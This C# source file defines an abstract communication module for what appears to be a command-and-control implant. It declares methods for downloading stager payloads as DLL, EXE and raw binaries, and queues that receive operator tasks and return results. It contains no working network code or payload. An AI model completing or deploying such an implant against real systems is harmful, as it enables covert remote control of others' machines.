using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Models
{
    public abstract class CommModule
    {
        public abstract Task<Byte[]> Download(string id, Action<int> OnCompletionChanged = null);

        public abstract Task<string> Upload(byte[] fileBytes, string filename, Action<int> OnCompletionChanged = null);


        public abstract Task<Byte[]> DownloadStagerDll();
        public abstract Task<Byte[]> DownloadStagerExe();
        public abstract Task<Byte[]> DownloadStagerBin();
        public abstract void Start();
        public abstract void Stop();

        protected ConcurrentQueue<AgentTask> _inbound = new ConcurrentQueue<AgentTask>();
        protected ConcurrentQueue<AgentTaskResult> _outBound = new ConcurrentQueue<AgentTaskResult>();
        protected AgentMetadata _agentmetaData;

        public virtual void Init(AgentMetadata metadata)
        {
            this._agentmetaData = metadata;
        }

        public bool ReceieveData(out IEnumerable<AgentTask> tasks)
        {
            if (_inbound.IsEmpty)
            {
                tasks = null;
                return false;
            }

            var list = new List<AgentTask>();
            while (_inbound.TryDequeue(out var task))
            {
                list.Add(task);
            }

            tasks = list;
            return true;
        }

        public void SendResult(AgentTaskResult result)
        {
            _outBound.Enqueue(result);
        }

        protected IEnumerable<AgentTaskResult> GetOutbound()
        {
            var list = new List<AgentTaskResult>();
            while (_outBound.TryDequeue(out var task))
            {
                list.Add(task);
            }

            return list;
        }
    }
}
